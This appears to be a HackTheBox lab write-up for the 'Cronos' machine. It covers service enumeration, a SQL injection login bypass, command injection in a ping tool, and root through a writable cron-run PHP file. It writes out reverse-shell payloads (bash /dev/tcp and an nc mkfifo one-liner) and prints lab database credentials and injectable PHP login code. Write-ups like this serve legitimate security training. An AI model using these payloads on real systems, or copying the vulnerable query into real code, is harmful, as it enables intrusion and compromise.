# Cronos - HackTheBox WriteUp

![info_card](/images/cronos/info_card.png)

## Enumeration & Information Gathering
 
#### Scanning 

**Nmap:**
```
Nmap scan report for 10.10.10.13
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 18:b9:73:82:6f:26:c7:78:8f:1b:39:88:d8:02:ce:e8 (RSA)
|   256 1a:e6:06:a6:05:0b:bb:41:92:b0:28:bf:7f:e5:96:3b (ECDSA)
|_  256 1a:0e:e7:ba:00:cc:02:01:04:cd:a3:a9:3f:5e:22:20 (ED25519)
53/tcp open  domain  ISC BIND 9.10.3-P4 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.10.3-P4-Ubuntu
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works

```

#### Service Enumeration 

**22:**
22/tcp open  ssh     OpenSSH 7.2p2

Not much to do here


**53:**

Enumerating the DNS service and trying to resove 127.0.0.1, 10.10.10.13, cronos.htb using the DNS server 

```
root@kali:~/Desktop# dig cronos.htb @10.10.10.13

; <<>> DiG 9.11.16-2-Debian <<>> cronos.htb @10.10.10.13
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 36327
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 1, ADDITIONAL: 2

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4096
;; QUESTION SECTION:
;cronos.htb.                    IN      A

;; ANSWER SECTION:
cronos.htb.             604800  IN      A       10.10.10.13

;; AUTHORITY SECTION:
cronos.htb.             604800  IN      NS      ns1.cronos.htb.

;; ADDITIONAL SECTION:
ns1.cronos.htb.         604800  IN      A       10.10.10.13
```

We add cronos.htb to our hosts record.

**80:** Apache/2.4.18 (Ubuntu) 

Upon visiting the home page we only get the Apache Default web page.

robots.txt returned 404 not found

After addin cronos.htb to the hosts file and visiting http://cronos.htb

![home](/images/cronos/home.png)

**Nikto:**

```
 Allowed HTTP Methods: GET, HEAD 
+ OSVDB-3092: /web.config: ASP config file is accessible.
+ OSVDB-3268: /css/: Directory indexing found.
+ OSVDB-3092: /css/: This might be interesting...
+ OSVDB-3233: /icons/README: Apache default file found.
```

There's a web config file, asp on an ubuntu system? weird.

All the links on the home page are out of scope and point to Laravel, so we start a directory bruteforce attack while enurating further.

```
root@kali:~/Desktop# gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://cronos.htb -x asp,html,config,txt -t 50
web.config
robots.txt

```

After directory busting for a while without finding anything, we have to go over our enumeration once again and think smarter.

SSH would yeild nothing and no need to bruteforce it, we already found the domain name from the DNS server but maybe we can find dig more?

On HTTP we found web.config and read an interesting article about uploading malicious web.config page to a web server to get code execution, however, this seemed to be an IIS (windows) based exploit.

Finally, we are left with bruteforcing for vhosts.

```
root@kali:~/Desktop# gobuster vhost -w /usr/share/wordlists/dirb/common.txt -u http://cronos.htb  -t 30
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:          http://cronos.htb
[+] Threads:      30
[+] Wordlist:     /usr/share/wordlists/dirb/common.txt
[+] User Agent:   gobuster/3.0.1
[+] Timeout:      10s
===============================================================
2020/05/01 00:26:18 Starting gobuster
===============================================================
Found: admin.cronos.htb (Status: 200) [Size: 2580]
Found: ADMIN.cronos.htb (Status: 200) [Size: 2580]
Found: Admin.cronos.htb (Status: 200) [Size: 2580]
===============================================================
2020/05/01 00:26:32 Finished
===============================================================

```

we find admin.cronos.htb and also add that to /etc/hosts

![admin](/images/cronos/admin.png)

On the admin page, trying admin:admin did not work and various other easy credentials failed. We thinking and making a more guesses on the credentials we kick of a directory scan on the admin url

```
root@kali:~/Desktop# gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://admin.cronos.htb -x php,txt -t 30
/welcome.php (Status: 302)
/index.php (Status: 200)
/logout.php (Status: 302)
/config.php (Status: 200)
/session.php (Status: 302)

```


## Exploitation 

Checking welcome.php, we see it redirects to index.php, however, reading the source code we can see something interesting.

![welcome](/images/cronos/welcome_code.png)


This appears to be Tool that does ping and traceroute, but we cannot access it.
ExploitDB shows there is an easy command injection on the tool 


Since we cannot use this exploit and have not found a way in yet, we go back to trying to login to the admin page again.

What if we don't need to authenticate and we can bypass login.

Going back to SQLi and trying common authentication bypass methods like: admin' #

We are able to login!

Now we can try a command injection simply by appending bash commands 

![wecome_admin](/images/cronos/wecome_admin.png)


#### Foothold 


Set up a netcat listener 

> nc -lnvp 443

and run a bash reverse shell on the Net Tool interface
> 8.8.8.8; /bin/bash -i >& /dev/tcp/10.10.14.22/443 0>&1

Doesn't work, let's try netcat.

"8.8.8.8; which nc" shows netcat is installed (/bin/nc)

Using the below netcat command we get a reverse shell

>8.8.8.8;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|/bin/nc 10.10.14.22 443 >/tmp/f


We get an upgraded shell by running 
```
CTRL + Z  (to background)
stty raw -echo 
fg
enter (twice)
reset
export TERM=xterm
```


#### Post Exploitation Enumeration 

On the directory we landed we start listing and reading all files and we find on the config.php file the MySQL credentials

![mysql_creds](/images/cronos/mysql_creds.png)

```
www-data@cronos:/var/www/admin$ cat config.php 
<?php
   define('DB_SERVER', 'localhost');
   define('DB_USERNAME', 'admin');
   define('DB_PASSWORD', 'kEjdbRigfBHUREiNSDs');
   define('DB_DATABASE', 'admin');
   $db = mysqli_connect(DB_SERVER,DB_USERNAME,DB_PASSWORD,DB_DATABASE);
?>
```



We login into the mysql database using the found credentials:

```
www-data@cronos:/var/www/admin$ mysql -u admin admin -p
Enter password: 
```

The DB has only one table "Users" which contians only user admin and it's password.

Moving on, let's try the credentials anywhere else we can.

The on home folder we see that there is a user noulis. Trying to SSH with the user and the DB password failed.

Since we have the user flag we can try to grab and and indeed we can read it!



![evidence](evidence) 



## Privilege Escalation 

Running  linpeas.sh on the victim 

we see a potention priv esc path via a cron job:

```
* * * * *       root    php /var/www/laravel/artisan schedule:run >> /dev/null 2>&1
```


Checking the file which is scheduled to run continuosly by root we see that it is owned by our user www-data and it's a php file.

![artisan](/images/cronos/artisan.png)



We set up a netcat reverse shell, backup the artisan file, replace it with a php reverse shell and wait for a connection on the listener. 



After about a minute we get a root shell!

![root](/images/cronos/root.png)

**Miscellaneous** 

Vulnerable MYSQL Statement in index.php
No input validation, parametized queries nor quote escape functions used for the username field 

```
$sql = "SELECT id FROM users WHERE username = '".$myusername."' and password = '".$mypassword."'";
With our unput becomes:
$sql = "SELECT id FROM users WHERE username = 'admin' # ".$myusername."' and password = '".$mypassword."'";
```

The rest of the statement gets ignored!


```
www-data@cronos:/var/www/admin$ cat index.php 
<?php
//ini_set('display_errors', 1);
//ini_set('display_startup_errors', 1);
//error_reporting(E_ALL);
   include("config.php");
   session_start();
   
   if($_SERVER["REQUEST_METHOD"] == "POST") {
      // username and password sent from form 
      
      $myusername = $_POST['username'];
      $mypassword = md5($_POST['password']); 

      $sql = "SELECT id FROM users WHERE username = '".$myusername."' and password = '".$mypassword."'";
      $result = mysqli_query($db,$sql);
      $row = mysqli_fetch_array($result,MYSQLI_ASSOC);
      //$active = $row['active'];
      $count = mysqli_num_rows($result);
      
      // If result matched $myusername and $mypassword, table row must be 1 row

      if($count == 1) {
         //session_register("myusername");
         $_SESSION['login_user'] = $myusername;
         
         header("location: welcome.php");
      }else {
         $error = "Your Login Name or Password is invalid";
      }
   }
?>
```
